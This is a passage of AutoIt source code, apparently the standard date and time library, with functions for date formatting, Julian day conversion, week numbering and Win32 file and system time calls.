	EndSelect
EndFunc   ;==>_datenextmonthnum

Func _datenextmonthyear($imonthnum, $iyear)
	Select
		Case Not StringIsInt($imonthnum) Or Not StringIsInt($iyear)
			Return SetError(1, 0, 0)
		Case $imonthnum < 1 Or $imonthnum > 12
			Return SetError(1, 0, 0)
		Case Else
			Local $inextyear
			If $imonthnum = 12 Then
				$inextyear = $iyear + 1
			Else
				$inextyear = $iyear
			EndIf
			$inextyear = StringFormat("%04d", $inextyear)
			Return $inextyear
	EndSelect
EndFunc   ;==>_datenextmonthyear

Func _DateTimeFormat($sdate, $stype)
	Local $asdatepart[4], $astimepart[4]
	Local $stempdate = "", $stemptime = ""
	Local $sam, $spm, $lngx
	If Not _DateIsValid($sdate) Then
		Return SetError(1, 0, "")
	EndIf
	If $stype < 0 Or $stype > 5 Or Not IsInt($stype) Then
		Return SetError(2, 0, "")
	EndIf
	_DateTimeSplit($sdate, $asdatepart, $astimepart)
	Switch $stype
		Case 0
			$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 31, "wstr", "", "int", 255)
			If Not @error And $lngx[0] <> 0 Then
				$stempdate = $lngx[3]
			Else
				$stempdate = "M/d/yyyy"
			EndIf
			If $astimepart[0] > 1 Then
				$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 4099, "wstr", "", "int", 255)
				If Not @error And $lngx[0] <> 0 Then
					$stemptime = $lngx[3]
				Else
					$stemptime = "h:mm:ss tt"
				EndIf
			EndIf
		Case 1
			$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 32, "wstr", "", "int", 255)
			If Not @error And $lngx[0] <> 0 Then
				$stempdate = $lngx[3]
			Else
				$stempdate = "dddd, MMMM dd, yyyy"
			EndIf
		Case 2
			$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 31, "wstr", "", "int", 255)
			If Not @error And $lngx[0] <> 0 Then
				$stempdate = $lngx[3]
			Else
				$stempdate = "M/d/yyyy"
			EndIf
		Case 3
			If $astimepart[0] > 1 Then
				$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 4099, "wstr", "", "int", 255)
				If Not @error And $lngx[0] <> 0 Then
					$stemptime = $lngx[3]
				Else
					$stemptime = "h:mm:ss tt"
				EndIf
			EndIf
		Case 4
			If $astimepart[0] > 1 Then
				$stemptime = "hh:mm"
			EndIf
		Case 5
			If $astimepart[0] > 1 Then
				$stemptime = "hh:mm:ss"
			EndIf
	EndSwitch
	If $stempdate <> "" Then
		$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 29, "wstr", "", "int", 255)
		If Not @error And $lngx[0] <> 0 Then
			$stempdate = StringReplace($stempdate, "/", $lngx[3])
		EndIf
		Local $iwday = _DateToDayOfWeek($asdatepart[1], $asdatepart[2], $asdatepart[3])
		$asdatepart[3] = StringRight("0" & $asdatepart[3], 2)
		$asdatepart[2] = StringRight("0" & $asdatepart[2], 2)
		$stempdate = StringReplace($stempdate, "d", "@")
		$stempdate = StringReplace($stempdate, "m", "#")
		$stempdate = StringReplace($stempdate, "y", "&")
		$stempdate = StringReplace($stempdate, "@@@@", _DateDayOfWeek($iwday, 0))
		$stempdate = StringReplace($stempdate, "@@@", _DateDayOfWeek($iwday, 1))
		$stempdate = StringReplace($stempdate, "@@", $asdatepart[3])
		$stempdate = StringReplace($stempdate, "@", StringReplace(StringLeft($asdatepart[3], 1), "0", "") & StringRight($asdatepart[3], 1))
		$stempdate = StringReplace($stempdate, "####", _DateToMonth($asdatepart[2], 0))
		$stempdate = StringReplace($stempdate, "###", _DateToMonth($asdatepart[2], 1))
		$stempdate = StringReplace($stempdate, "##", $asdatepart[2])
		$stempdate = StringReplace($stempdate, "#", StringReplace(StringLeft($asdatepart[2], 1), "0", "") & StringRight($asdatepart[2], 1))
		$stempdate = StringReplace($stempdate, "&&&&", $asdatepart[1])
		$stempdate = StringReplace($stempdate, "&&", StringRight($asdatepart[1], 2))
	EndIf
	If $stemptime <> "" Then
		$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 40, "wstr", "", "int", 255)
		If Not @error And $lngx[0] <> 0 Then
			$sam = $lngx[3]
		Else
			$sam = "AM"
		EndIf
		$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 41, "wstr", "", "int", 255)
		If Not @error And $lngx[0] <> 0 Then
			$spm = $lngx[3]
		Else
			$spm = "PM"
		EndIf
		$lngx = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 30, "wstr", "", "int", 255)
		If Not @error And $lngx[0] <> 0 Then
			$stemptime = StringReplace($stemptime, ":", $lngx[3])
		EndIf
		If StringInStr($stemptime, "tt") Then
			If $astimepart[1] < 12 Then
				$stemptime = StringReplace($stemptime, "tt", $sam)
				If $astimepart[1] = 0 Then $astimepart[1] = 12
			Else
				$stemptime = StringReplace($stemptime, "tt", $spm)
				If $astimepart[1] > 12 Then $astimepart[1] = $astimepart[1] - 12
			EndIf
		EndIf
		$astimepart[1] = StringRight("0" & $astimepart[1], 2)
		$astimepart[2] = StringRight("0" & $astimepart[2], 2)
		$astimepart[3] = StringRight("0" & $astimepart[3], 2)
		$stemptime = StringReplace($stemptime, "hh", StringFormat("%02d", $astimepart[1]))
		$stemptime = StringReplace($stemptime, "h", StringReplace(StringLeft($astimepart[1], 1), "0", "") & StringRight($astimepart[1], 1))
		$stemptime = StringReplace($stemptime, "mm", StringFormat("%02d", $astimepart[2]))
		$stemptime = StringReplace($stemptime, "ss", StringFormat("%02d", $astimepart[3]))
		$stempdate = StringStripWS($stempdate & " " & $stemptime, 3)
	EndIf
	Return $stempdate
EndFunc   ;==>_DateTimeFormat

Func _DateTimeSplit($sdate, ByRef $asdatepart, ByRef $itimepart)
	Local $sdatetime = StringSplit($sdate, " T")
	If $sdatetime[0] > 0 Then $asdatepart = StringSplit($sdatetime[1], "/-.")
	If $sdatetime[0] > 1 Then
		$itimepart = StringSplit($sdatetime[2], ":")
		If UBound($itimepart) < 4 Then ReDim $itimepart[4]
	Else
		Dim $itimepart[4]
	EndIf
	If UBound($asdatepart) < 4 Then ReDim $asdatepart[4]
	For $x = 1 To 3
		If StringIsInt($asdatepart[$x]) Then
			$asdatepart[$x] = Number($asdatepart[$x])
		Else
			$asdatepart[$x] = -1
		EndIf
		If StringIsInt($itimepart[$x]) Then
			$itimepart[$x] = Number($itimepart[$x])
		Else
			$itimepart[$x] = 0
		EndIf
	Next
	Return 1
EndFunc   ;==>_DateTimeSplit

Func _DateToDayOfWeek($iyear, $imonth, $iday)
	If Not _DateIsValid($iyear & "/" & $imonth & "/" & $iday) Then
		Return SetError(1, 0, "")
	EndIf
	Local $i_afactor = Int((14 - $imonth) / 12)
	Local $i_yfactor = $iyear - $i_afactor
	Local $i_mfactor = $imonth + (12 * $i_afactor) - 2
	Local $i_dfactor = Mod($iday + $i_yfactor + Int($i_yfactor / 4) - Int($i_yfactor / 100) + Int($i_yfactor / 400) + Int((31 * $i_mfactor) / 12), 7)
	Return ($i_dfactor + 1)
EndFunc   ;==>_DateToDayOfWeek

Func _DateToDayOfWeekISO($iyear, $imonth, $iday)
	Local $idow = _DateToDayOfWeek($iyear, $imonth, $iday)
	If @error Then
		Return SetError(1, 0, "")
	EndIf
	If $idow >= 2 Then Return $idow - 1
	Return 7
EndFunc   ;==>_DateToDayOfWeekISO

Func _DateToDayValue($iyear, $imonth, $iday)
	If Not _DateIsValid(StringFormat("%04d/%02d/%02d", $iyear, $imonth, $iday)) Then
		Return SetError(1, 0, "")
	EndIf
	If $imonth < 3 Then
		$imonth = $imonth + 12
		$iyear = $iyear - 1
	EndIf
	Local $i_afactor = Int($iyear / 100)
	Local $i_bfactor = Int($i_afactor / 4)
	Local $i_cfactor = 2 - $i_afactor + $i_bfactor
	Local $i_efactor = Int(1461 * ($iyear + 4716) / 4)
	Local $i_ffactor = Int(153 * ($imonth + 1) / 5)
	Local $ijuliandate = $i_cfactor + $iday + $i_efactor + $i_ffactor - 1524.5
	Return ($ijuliandate)
EndFunc   ;==>_DateToDayValue

Func _DateToMonth($imonth, $ishort = 0)
	Local $amonthnumber[13] = ["", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
	Local $amonthnumberabbrev[13] = ["", "Jan", "Feb", "Mar", "Apr", "May", "June", "July", "Aug", "Sept", "Oct", "Nov", "Dec"]
	Select
		Case Not StringIsInt($imonth)
			Return SetError(1, 0, "")
		Case $imonth < 1 Or $imonth > 12
			Return SetError(1, 0, "")
		Case Else
			Select
				Case $ishort = 0
					Return $amonthnumber[$imonth]
				Case $ishort = 1
					Return $amonthnumberabbrev[$imonth]
				Case Else
					Return SetError(1, 0, "")
			EndSelect
	EndSelect
EndFunc   ;==>_DateToMonth

Func _DayValueToDate($ijuliandate, ByRef $iyear, ByRef $imonth, ByRef $iday)
	If $ijuliandate < 0 Or Not IsNumber($ijuliandate) Then
		Return SetError(1, 0, 0)
	EndIf
	Local $i_zfactor = Int($ijuliandate + 0.5)
	Local $i_wfactor = Int(($i_zfactor - 1867216.25) / 36524.25)
	Local $i_xfactor = Int($i_wfactor / 4)
	Local $i_afactor = $i_zfactor + 1 + $i_wfactor - $i_xfactor
	Local $i_bfactor = $i_afactor + 1524
	Local $i_cfactor = Int(($i_bfactor - 122.1) / 365.25)
	Local $i_dfactor = Int(365.25 * $i_cfactor)
	Local $i_efactor = Int(($i_bfactor - $i_dfactor) / 30.6001)
	Local $i_ffactor = Int(30.6001 * $i_efactor)
	$iday = $i_bfactor - $i_dfactor - $i_ffactor
	If $i_efactor - 1 < 13 Then
		$imonth = $i_efactor - 1
	Else
		$imonth = $i_efactor - 13
	EndIf
	If $imonth < 3 Then
		$iyear = $i_cfactor - 4715
	Else
		$iyear = $i_cfactor - 4716
	EndIf
	$iyear = StringFormat("%04d", $iyear)
	$imonth = StringFormat("%02d", $imonth)
	$iday = StringFormat("%02d", $iday)
	Return $iyear & "/" & $imonth & "/" & $iday
EndFunc   ;==>_DayValueToDate

Func _date_juliandayno($iyear, $imonth, $iday)
	Local $sfulldate = StringFormat("%04d/%02d/%02d", $iyear, $imonth, $iday)
	If Not _DateIsValid($sfulldate) Then
		Return SetError(1, 0, "")
	EndIf
	Local $ijday = 0
	Local $aidaysinmonth = _daysinmonth($iyear)
	For $icntr = 1 To $imonth - 1
		$ijday = $ijday + $aidaysinmonth[$icntr]
	Next
	$ijday = ($iyear * 1000) + ($ijday + $iday)
	Return $ijday
EndFunc   ;==>_date_juliandayno

Func _juliantodate($ijday, $ssep = "/")
	Local $iyear = Int($ijday / 1000)
	Local $idays = Mod($ijday, 1000)
	Local $imaxdays = 365
	If _DateIsLeapYear($iyear) Then $imaxdays = 366
	If $idays > $imaxdays Then
		Return SetError(1, 0, "")
	EndIf
	Local $aidaysinmonth = _daysinmonth($iyear)
	Local $imonth = 1
	While $idays > $aidaysinmonth[$imonth]
		$idays = $idays - $aidaysinmonth[$imonth]
		$imonth = $imonth + 1
	WEnd
	Return StringFormat("%04d%s%02d%s%02d", $iyear, $ssep, $imonth, $ssep, $idays)
EndFunc   ;==>_juliantodate

Func _Now()
	Return (_DateTimeFormat(@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC, 0))
EndFunc   ;==>_Now

Func _NowCalc()
	Return (@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC)
EndFunc   ;==>_NowCalc

Func _NowCalcDate()
	Return (@YEAR & "/" & @MON & "/" & @MDAY)
EndFunc   ;==>_NowCalcDate

Func _NowDate()
	Return (_DateTimeFormat(@YEAR & "/" & @MON & "/" & @MDAY, 0))
EndFunc   ;==>_NowDate

Func _NowTime($stype = 3)
	If $stype < 3 Or $stype > 5 Then $stype = 3
	Return (_DateTimeFormat(@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC, $stype))
EndFunc   ;==>_NowTime

Func _SetDate($iday, $imonth = 0, $iyear = 0)
	If $iyear = 0 Then $iyear = @YEAR
	If $imonth = 0 Then $imonth = @MON
	If Not _DateIsValid($iyear & "/" & $imonth & "/" & $iday) Then Return 1
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetLocalTime", "struct*", $tsystemtime)
	If @error Then Return SetError(@error, @extended, 0)
	DllStructSetData($tsystemtime, 4, $iday)
	If $imonth > 0 Then DllStructSetData($tsystemtime, 2, $imonth)
	If $iyear > 0 Then DllStructSetData($tsystemtime, 1, $iyear)
	Local $iretval = _Date_Time_SetLocalTime($tsystemtime)
	If @error Then Return SetError(@error, @extended, 0)
	Return Int($iretval)
EndFunc   ;==>_SetDate

Func _SetTime($ihour, $iminute, $isecond = 0)
	If $ihour < 0 Or $ihour > 23 Then Return 1
	If $iminute < 0 Or $iminute > 59 Then Return 1
	If $isecond < 0 Or $isecond > 59 Then Return 1
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetLocalTime", "struct*", $tsystemtime)
	If @error Then Return SetError(@error, @extended, 0)
	DllStructSetData($tsystemtime, 5, $ihour)
	DllStructSetData($tsystemtime, 6, $iminute)
	If $isecond > 0 Then DllStructSetData($tsystemtime, 7, $isecond)
	Local $iretval = _Date_Time_SetLocalTime($tsystemtime)
	If @error Then Return SetError(@error, @extended, 0)
	Return Int($iretval)
EndFunc   ;==>_SetTime

Func _TicksToTime($iticks, ByRef $ihours, ByRef $imins, ByRef $isecs)
	If Number($iticks) > 0 Then
		$iticks = Int($iticks / 1000)
		$ihours = Int($iticks / 3600)
		$iticks = Mod($iticks, 3600)
		$imins = Int($iticks / 60)
		$isecs = Mod($iticks, 60)
		Return 1
	ElseIf Number($iticks) = 0 Then
		$ihours = 0
		$iticks = 0
		$imins = 0
		$isecs = 0
		Return 1
	Else
		Return SetError(1, 0, 0)
	EndIf
EndFunc   ;==>_TicksToTime

Func _TimeToTicks($ihours = @HOUR, $imins = @MIN, $isecs = @SEC)
	If StringIsInt($ihours) And StringIsInt($imins) And StringIsInt($isecs) Then
		Local $iticks = 1000 * ((3600 * $ihours) + (60 * $imins) + $isecs)
		Return $iticks
	Else
		Return SetError(1, 0, 0)
	EndIf
EndFunc   ;==>_TimeToTicks

Func _WeekNumberISO($iyear = @YEAR, $imonth = @MON, $iday = @MDAY)
	If $iday > 31 Or $iday < 1 Then
		Return SetError(1, 0, -1)
	ElseIf $imonth > 12 Or $imonth < 1 Then
		Return SetError(1, 0, -1)
	ElseIf $iyear < 1 Or $iyear > 2999 Then
		Return SetError(1, 0, -1)
	EndIf
	Local $idow = _DateToDayOfWeekISO($iyear, $imonth, $iday) - 1
	Local $idow0101 = _DateToDayOfWeekISO($iyear, 1, 1) - 1
	If ($imonth = 1 And 3 < $idow0101 And $idow0101 < 7 - ($iday - 1)) Then
		$idow = $idow0101 - 1
		$idow0101 = _DateToDayOfWeekISO($iyear - 1, 1, 1) - 1
		$imonth = 12
		$iday = 31
		$iyear = $iyear - 1
	ElseIf ($imonth = 12 And 30 - ($iday - 1) < _DateToDayOfWeekISO($iyear + 1, 1, 1) - 1 And _DateToDayOfWeekISO($iyear + 1, 1, 1) - 1 < 4) Then
		Return 1
	EndIf
	Return Int((_DateToDayOfWeekISO($iyear, 1, 1) - 1 < 4) + 4 * ($imonth - 1) + (2 * ($imonth - 1) + ($iday - 1) + $idow0101 - $idow + 6) * 36 / 256)
EndFunc   ;==>_WeekNumberISO

Func _weeknumber($iyear = @YEAR, $imonth = @MON, $iday = @MDAY, $iweekstart = 1)
	If $iday > 31 Or $iday < 1 Then
		Return SetError(1, 0, -1)
	ElseIf $imonth > 12 Or $imonth < 1 Then
		Return SetError(1, 0, -1)
	ElseIf $iyear < 1 Or $iyear > 2999 Then
		Return SetError(1, 0, -1)
	ElseIf $iweekstart < 1 Or $iweekstart > 2 Then
		Return SetError(2, 0, -1)
	EndIf
	Local $istartweek1, $iendweek1
	Local $idow0101 = _DateToDayOfWeekISO($iyear, 1, 1)
	Local $idate = $iyear & "/" & $imonth & "/" & $iday
	If $iweekstart = 1 Then
		If $idow0101 = 6 Then
			$istartweek1 = 0
		Else
			$istartweek1 = -1 * $idow0101 - 1
		EndIf
		$iendweek1 = $istartweek1 + 6
	Else
		$istartweek1 = $idow0101 * -1
		$iendweek1 = $istartweek1 + 6
	EndIf
	Local $istartweek1ny
	Local $iendweek1date = _DateAdd("d", $iendweek1, $iyear & "/01/01")
	Local $idow0101ny = _DateToDayOfWeekISO($iyear + 1, 1, 1)
	If $iweekstart = 1 Then
		If $idow0101ny = 6 Then
			$istartweek1ny = 0
		Else
			$istartweek1ny = -1 * $idow0101ny - 1
		EndIf
	Else
		$istartweek1ny = $idow0101ny * -1
	EndIf
	Local $istartweek1dateny = _DateAdd("d", $istartweek1ny, $iyear + 1 & "/01/01")
	Local $icurrdatediff = _DateDiff("d", $iendweek1date, $idate) - 1
	Local $icurrdatediffny = _DateDiff("d", $istartweek1dateny, $idate)
	If $icurrdatediff >= 0 And $icurrdatediffny < 0 Then Return 2 + Int($icurrdatediff / 7)
	If $icurrdatediff < 0 Or $icurrdatediffny >= 0 Then Return 1
EndFunc   ;==>_weeknumber

Func _daysinmonth($iyear)
	Local $aidays[13] = [0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
	If _DateIsLeapYear($iyear) Then $aidays[2] = 29
	Return $aidays
EndFunc   ;==>_daysinmonth

Func __date_time_clonesystemtime($psystemtime)
	Local $tsystemtime1 = DllStructCreate($tagsystemtime, $psystemtime)
	Local $tsystemtime2 = DllStructCreate($tagsystemtime)
	DllStructSetData($tsystemtime2, "Month", DllStructGetData($tsystemtime1, "Month"))
	DllStructSetData($tsystemtime2, "Day", DllStructGetData($tsystemtime1, "Day"))
	DllStructSetData($tsystemtime2, "Year", DllStructGetData($tsystemtime1, "Year"))
	DllStructSetData($tsystemtime2, "Hour", DllStructGetData($tsystemtime1, "Hour"))
	DllStructSetData($tsystemtime2, "Minute", DllStructGetData($tsystemtime1, "Minute"))
	DllStructSetData($tsystemtime2, "Second", DllStructGetData($tsystemtime1, "Second"))
	DllStructSetData($tsystemtime2, "MSeconds", DllStructGetData($tsystemtime1, "MSeconds"))
	DllStructSetData($tsystemtime2, "DOW", DllStructGetData($tsystemtime1, "DOW"))
	Return $tsystemtime2
EndFunc   ;==>__date_time_clonesystemtime

Func _Date_Time_CompareFileTime($pfiletime1, $pfiletime2)
	Local $aresult = DllCall("kernel32.dll", "long", "CompareFileTime", "ptr", $pfiletime1, "ptr", $pfiletime2)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_Date_Time_CompareFileTime

Func _Date_Time_DOSDateTimeToFileTime($ifatdate, $ifattime)
	Local $ttime = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "DosDateTimeToFileTime", "word", $ifatdate, "word", $ifattime, "struct*", $ttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $ttime)
EndFunc   ;==>_Date_Time_DOSDateTimeToFileTime

Func _Date_Time_DOSDateToArray($idosdate)
	Local $adate[3]
	$adate[0] = BitAND($idosdate, 31)
	$adate[1] = BitAND(BitShift($idosdate, 5), 15)
	$adate[2] = BitAND(BitShift($idosdate, 9), 63) + 1980
	Return $adate
EndFunc   ;==>_Date_Time_DOSDateToArray

Func _Date_Time_DOSDateTimeToArray($idosdate, $idostime)
	Local $adate[6]
	$adate[0] = BitAND($idosdate, 31)
	$adate[1] = BitAND(BitShift($idosdate, 5), 15)
	$adate[2] = BitAND(BitShift($idosdate, 9), 63) + 1980
	$adate[5] = BitAND($idostime, 31) * 2
	$adate[4] = BitAND(BitShift($idostime, 5), 63)
	$adate[3] = BitAND(BitShift($idostime, 11), 31)
	Return $adate
EndFunc   ;==>_Date_Time_DOSDateTimeToArray

Func _Date_Time_DOSDateTimeToStr($idosdate, $idostime)
	Local $adate = _Date_Time_DOSDateTimeToArray($idosdate, $idostime)
	Return StringFormat("%02d/%02d/%04d %02d:%02d:%02d", $adate[0], $adate[1], $adate[2], $adate[3], $adate[4], $adate[5])
EndFunc   ;==>_Date_Time_DOSDateTimeToStr

Func _Date_Time_DOSDateToStr($idosdate)
	Local $adate = _Date_Time_DOSDateToArray($idosdate)
	Return StringFormat("%02d/%02d/%04d", $adate[0], $adate[1], $adate[2])
EndFunc   ;==>_Date_Time_DOSDateToStr

Func _Date_Time_DOSTimeToArray($idostime)
	Local $atime[3]
	$atime[2] = BitAND($idostime, 31) * 2
	$atime[1] = BitAND(BitShift($idostime, 5), 63)
	$atime[0] = BitAND(BitShift($idostime, 11), 31)
	Return $atime
EndFunc   ;==>_Date_Time_DOSTimeToArray

Func _Date_Time_DOSTimeToStr($idostime)
	Local $atime = _Date_Time_DOSTimeToArray($idostime)
	Return StringFormat("%02d:%02d:%02d", $atime[0], $atime[1], $atime[2])
EndFunc   ;==>_Date_Time_DOSTimeToStr

Func _Date_Time_EncodeFileTime($imonth, $iday, $iyear, $ihour = 0, $iminute = 0, $isecond = 0, $imseconds = 0)
	Local $tsystemtime = _Date_Time_EncodeSystemTime($imonth, $iday, $iyear, $ihour, $iminute, $isecond, $imseconds)
	Return _Date_Time_SystemTimeToFileTime($tsystemtime)
EndFunc   ;==>_Date_Time_EncodeFileTime

Func _Date_Time_EncodeSystemTime($imonth, $iday, $iyear, $ihour = 0, $iminute = 0, $isecond = 0, $imseconds = 0)
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllStructSetData($tsystemtime, "Month", $imonth)
	DllStructSetData($tsystemtime, "Day", $iday)
	DllStructSetData($tsystemtime, "Year", $iyear)
	DllStructSetData($tsystemtime, "Hour", $ihour)
	DllStructSetData($tsystemtime, "Minute", $iminute)
	DllStructSetData($tsystemtime, "Second", $isecond)
	DllStructSetData($tsystemtime, "MSeconds", $imseconds)
	Return $tsystemtime
EndFunc   ;==>_Date_Time_EncodeSystemTime

Func _Date_Time_FileTimeToArray(ByRef $tfiletime)
	If ((DllStructGetData($tfiletime, 1) + DllStructGetData($tfiletime, 2)) = 0) Then Return SetError(1, 0, 0)
	Local $tsystemtime = _Date_Time_FileTimeToSystemTime($tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return _Date_Time_SystemTimeToArray($tsystemtime)
EndFunc   ;==>_Date_Time_FileTimeToArray

Func _Date_Time_FileTimeToStr(ByRef $tfiletime, $bfmt = 0)
	Local $adate = _Date_Time_FileTimeToArray($tfiletime)
	If @error Then Return SetError(@error, @extended, "")
	If $bfmt Then
		Return StringFormat("%04d/%02d/%02d %02d:%02d:%02d", $adate[2], $adate[0], $adate[1], $adate[3], $adate[4], $adate[5])
	Else
		Return StringFormat("%02d/%02d/%04d %02d:%02d:%02d", $adate[0], $adate[1], $adate[2], $adate[3], $adate[4], $adate[5])
	EndIf
EndFunc   ;==>_Date_Time_FileTimeToStr

Func _Date_Time_FileTimeToDOSDateTime($pfiletime)
	Local $adate[2]
	Local $aresult = DllCall("kernel32.dll", "bool", "FileTimeToDosDateTime", "ptr", $pfiletime, "word*", 0, "word*", 0)
	If @error Then Return SetError(@error, @extended, $adate)
	$adate[0] = $aresult[2]
	$adate[1] = $aresult[3]
	Return SetExtended($aresult[0], $adate)
EndFunc   ;==>_Date_Time_FileTimeToDOSDateTime

Func _Date_Time_FileTimeToLocalFileTime($pfiletime)
	Local $tlocal = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "FileTimeToLocalFileTime", "struct*", $pfiletime, "struct*", $tlocal)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tlocal)
EndFunc   ;==>_Date_Time_FileTimeToLocalFileTime

Func _Date_Time_FileTimeToSystemTime($pfiletime)
	Local $tsysttime = DllStructCreate($tagsystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "FileTimeToSystemTime", "struct*", $pfiletime, "struct*", $tsysttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tsysttime)
EndFunc   ;==>_Date_Time_FileTimeToSystemTime

Func _Date_Time_GetFileTime($hfile)
	Local $adate[3]
	$adate[0] = DllStructCreate($tagfiletime)
	$adate[1] = DllStructCreate($tagfiletime)
	$adate[2] = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("Kernel32.dll", "bool", "GetFileTime", "handle", $hfile, "struct*", $adate[0], "struct*", $adate[1], "struct*", $adate[2])
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $adate)
EndFunc   ;==>_Date_Time_GetFileTime

Func _Date_Time_GetLocalTime()
	Local $tsysttime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetLocalTime", "struct*", $tsysttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tsysttime
EndFunc   ;==>_Date_Time_GetLocalTime

Func _Date_Time_GetSystemTime()
	Local $tsysttime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetSystemTime", "struct*", $tsysttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tsysttime
EndFunc   ;==>_Date_Time_GetSystemTime

Func _Date_Time_GetSystemTimeAdjustment()
	Local $ainfo[3]
	Local $aresult = DllCall("kernel32.dll", "bool", "GetSystemTimeAdjustment", "dword*", 0, "dword*", 0, "bool*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	$ainfo[0] = $aresult[1]
	$ainfo[1] = $aresult[2]
	$ainfo[2] = $aresult[3] <> 0
	Return SetExtended($aresult[0], $ainfo)
EndFunc   ;==>_Date_Time_GetSystemTimeAdjustment

Func _Date_Time_GetSystemTimeAsFileTime()
	Local $tfiletime = DllStructCreate($tagfiletime)
	DllCall("kernel32.dll", "none", "GetSystemTimeAsFileTime", "struct*", $tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tfiletime
EndFunc   ;==>_Date_Time_GetSystemTimeAsFileTime

Func _Date_Time_GetSystemTimes()
	Local $ainfo[3]
	$ainfo[0] = DllStructCreate($tagfiletime)
	$ainfo[1] = DllStructCreate($tagfiletime)
	$ainfo[2] = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetSystemTimes", "struct*", $ainfo[0], "struct*", $ainfo[1], "struct*", $ainfo[2])
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $ainfo)
EndFunc   ;==>_Date_Time_GetSystemTimes

Func _Date_Time_GetTickCount()
	Local $aresult = DllCall("kernel32.dll", "dword", "GetTickCount")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_Date_Time_GetTickCount

Func _Date_Time_GetTimeZoneInformation()
	Local $ttimezone = DllStructCreate($tagtime_zone_information)
	Local $aresult = DllCall("kernel32.dll", "dword", "GetTimeZoneInformation", "struct*", $ttimezone)
	If @error Or $aresult[0] = -1 Then Return SetError(@error, @extended, 0)
	Local $ainfo[8]
	$ainfo[0] = $aresult[0]
	$ainfo[1] = DllStructGetData($ttimezone, "Bias")
	$ainfo[2] = _WinAPI_WideCharToMultiByte(DllStructGetPtr($ttimezone, "StdName"))
	$ainfo[3] = __date_time_clonesystemtime(DllStructGetPtr($ttimezone, "StdDate"))
	$ainfo[4] = DllStructGetData($ttimezone, "StdBias")
	$ainfo[5] = _WinAPI_WideCharToMultiByte(DllStructGetPtr($ttimezone, "DayName"))
	$ainfo[6] = __date_time_clonesystemtime(DllStructGetPtr($ttimezone, "DayDate"))
	$ainfo[7] = DllStructGetData($ttimezone, "DayBias")
	Return $ainfo
EndFunc   ;==>_Date_Time_GetTimeZoneInformation

Func _Date_Time_LocalFileTimeToFileTime($plocaltime)
	Local $tfiletime = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "LocalFileTimeToFileTime", "ptr", $plocaltime, "struct*", $tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tfiletime)
EndFunc   ;==>_Date_Time_LocalFileTimeToFileTime

Func _Date_Time_SetFileTime($hfile, $pcreatetime, $plastaccess, $plastwrite)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetFileTime", "handle", $hfile, "ptr", $pcreatetime, "ptr", $plastaccess, "ptr", $plastwrite)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_Date_Time_SetFileTime

Func _Date_Time_SetLocalTime($psystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetLocalTime", "struct*", $psystemtime)
	If @error Or Not $aresult[0] Then Return SetError(@error, @extended, False)
	$aresult = DllCall("kernel32.dll", "bool", "SetLocalTime", "struct*", $psystemtime)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_Date_Time_SetLocalTime

Func _Date_Time_SetSystemTime($psystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetSystemTime", "ptr", $psystemtime)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_Date_Time_SetSystemTime

Func _Date_Time_SetSystemTimeAdjustment($iadjustment, $fdisabled)
	Local $htoken = _Security__OpenThreadTokenEx(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error, @extended, False)
	_Security__SetPrivilege($htoken, "SeSystemtimePrivilege", True)
	Local $ierror = @error
	Local $ilasterror = @extended
	Local $iret = False
	If Not @error Then
